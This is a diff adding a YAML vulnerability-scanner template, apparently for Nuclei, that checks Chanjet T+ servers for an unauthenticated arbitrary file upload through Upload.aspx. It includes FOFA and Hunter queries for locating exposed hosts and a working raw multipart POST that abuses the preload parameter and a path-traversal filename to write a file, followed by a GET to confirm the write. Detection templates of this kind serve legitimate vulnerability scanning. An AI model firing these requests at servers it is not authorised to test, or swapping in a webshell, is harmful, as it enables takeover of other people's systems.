@@ -1,0 +1,45 @@
+id: changjet-tplus-upload-aspx-fileupload
+info:
+  name: 畅捷通 T+ Upload.aspx - 任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 用友畅捷通 T+ Upload.aspx 接口存在任意文件上传漏洞，攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器
+  reference:
+    - https://www.cnblogs.com/pursue-security/p/17684758.html
+  metadata:
+    verified: true
+    hunter-query: app.name="畅捷通 T+"
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+  tags: changjet,fileupload,tplus
+  
+variables:
+  random_str: "{{rand_base(6)}}"
+  match_str: "{{md5(random_str)}}"
+
+http:
+  - raw:
+      - |
+        POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylsdetdhw
+        Content-Length: 250
+
+        ------WebKitFormBoundarylsdetdhw
+        Content-Disposition: form-data; name="File1"; filename="../../../img/login/{{random_str}}.jpg"
+        Content-Type: image/jpeg
+
+        bkohkodaqebdjwibnzbvxclgsnihgaoenatmgfdswocdpveqceaezzjdlqly
+        ------WebKitFormBoundarylsdetdhw--
+
+      - |
+        GET /tplus/img/login/{{random_str}}.jpg HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2,'bkohkodaqebdjwibnzbvxclgsnihgaoenatmgfdswocdpveqceaezzjdlqly')"
+        condition: and
+
